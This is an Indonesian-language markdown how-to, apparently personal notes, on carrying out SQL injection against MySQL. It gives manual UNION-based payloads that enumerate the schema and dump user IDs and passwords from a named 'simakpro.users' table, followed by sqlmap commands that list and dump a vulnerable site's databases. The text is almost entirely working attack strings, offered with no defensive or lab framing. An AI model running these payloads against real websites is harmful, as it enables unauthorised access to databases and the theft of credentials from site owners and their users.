## Langkah-langkah melakukan SQL Injection secara manual
* Mencari tahu apakah inputan memiliki vuln untuk dilakukan sql injection dengan memasukan karakter `' atau "`
* Apabila terdapat vuln, maka masukan script Cth: `' ORDER BY 2 #` <- Script ini berguna untuk mengetahui jumlah tables dalam database.
* Selanjutnya jika sudah diketahui banyaknya tables, maka jalankan script berikut, Cth:
```bash
' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 #
```
* Selanjutnya, untuk mengetahui user dan nama database yang digunakan menggunakan script berikut, Cth:
```bash
' UNION ALL SELECT 1,2,3,user(),5,6,7,database(),9,10 #
```

* Selanjutnya untuk mengetahui list database yang tersimpan pada MYSQL, menggunakan script berikut, Cth:
```bash
' UNION ALL SELECT 1,2,3,schema_name,5,6,7,8,9,10 FROM information_schema.schemata #
```

* Selanjutnya, untuk mendapatkan list tables dari database tertentu, menggunakan script berikut, Cth:
```bash
' UNION SELECT 1,2,3,table_name,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema = 'simakpro' #
```

* Selanjutnya, untuk mendapatkan informasi yang lebih spesifik kolom-kolom dari sebuah table, menggunakan script berikut, Cth:
```bash
' UNION SELECT 1,2,3,column_name,5,6,7,column_type,9,10 FROM information_schema.columns WHERE table_schema = 'simakpro'  AND table_name = 'users' #
```

* Terakhir, untuk mendapatkan record data dalam table yang dipilih, menggunakan script berikut, Cth:
```bash
' UNION SELECT 1,2,3,CONCAT(usrid,' - ',passwd,' - ',level, ' - ', type_user),5,6,7,8,9,10 FROM simakpro.users #
```


## Langkah-langkah melakukan SQL Injection secara otomatis menggunakan SQLMAP
* Mencari tahu apakah aplikasi website memiliki vuln sql injection dengan memasukan script ' secara manual ke inputan.
* Selanjutnya, Masukan perintah berikut untuk mengetahui vuln sql injectionnya
```bash
sqlmap -u "linkinputvulnSqlInjection"
```
* Selanjutnya, Masukan perintah berikut untuk mengetahui daftar isi databasenya
```bash
sqlmap -u "linkinputvulnSqlInjection" --dbs
```
* Selanjutnya, Masukan perintah berikut untuk melihat daftar tables didalam database yang dipilih
```bash
sqlmap -u "linkinputvulnSqlInjection" -D [db_name] --tables
```
* Selanjutnya, Masukan perintah berikut untuk melihat struktur tables yang dipilih
```bash
sqlmap -u "linkinputvulnSqlInjection" -D [db_name] -T [table_name] --columns
```
* Terakhir, Masukan perintah berikut untuk melihat record data didalam tables dari nama columns yang dipilih
```bash
sqlmap -u "linkinputvulnSqlInjection" -D [db_name] -T [table_name] [name_columns,name_columns] --dump
```
